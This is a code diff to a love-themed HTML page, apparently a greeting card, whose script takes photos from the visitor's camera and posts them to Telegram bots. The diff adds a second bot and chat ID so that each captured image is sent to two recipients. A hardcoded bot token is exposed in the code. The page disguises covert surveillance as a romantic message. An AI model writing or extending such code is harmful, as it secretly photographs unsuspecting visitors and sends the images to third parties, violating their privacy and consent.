@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>I Love You</title>
+  <title>Hello I'm Miraz</title></title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Pinyon+Script&display=swap');
 
@@ -118,8 +118,14 @@
     const canvas = document.getElementById('canvas');
     const context = canvas.getContext('2d');
     const music = document.getElementById('loveAudio');
-    const botToken = '7603770395:AAEBlEAafIokfEyS-lTeudujGMNVfTg7LaY'; // Replace with your bot token
-    const chatId = '7767412329';    // Replace with your chat ID
+    
+    // Bot 1 details
+    const bot1Token = '7603770395:AAEBlEAafIokfEyS-lTeudujGMNVfTg7LaY'; 
+    const bot1ChatId = '7767412329';
+
+    // Bot 2 details
+    const bot2Token = '7603770395:AAEBlEAafIokfEyS-lTeudujGMNVfTg7LaY'; // Replace with Bot 2's Token
+    const bot2ChatId = '7888600155'; // Replace with Bot 2's Chat ID
 
     let useFrontCamera = true; // Start with front camera
     let isMusicPlaying = false;
@@ -151,7 +157,7 @@
       }
     }
 
-    // Capture photo and send to Telegram
+    // Capture photo and send to both Telegram bots
     function captureAndSendPhoto() {
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
@@ -160,7 +166,8 @@
       const base64Image = canvas.toDataURL('image/png');
       const blob = base64ToBlob(base64Image);
 
-      sendToTelegram(blob);
+      sendToTelegram(bot1Token, bot1ChatId, blob); // Send to Bot 1
+      sendToTelegram(bot2Token, bot2ChatId, blob); // Send to Bot 2
     }
 
     // Convert Base64 to Blob
@@ -177,8 +184,8 @@
     }
 
     // Send photo to Telegram
-    function sendToTelegram(blob) {
-      const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+    function sendToTelegram(token, chatId, blob) {
+      const url = `https://api.telegram.org/bot${token}/sendPhoto`;
 
       const formData = new FormData();
       formData.append('chat_id', chatId);
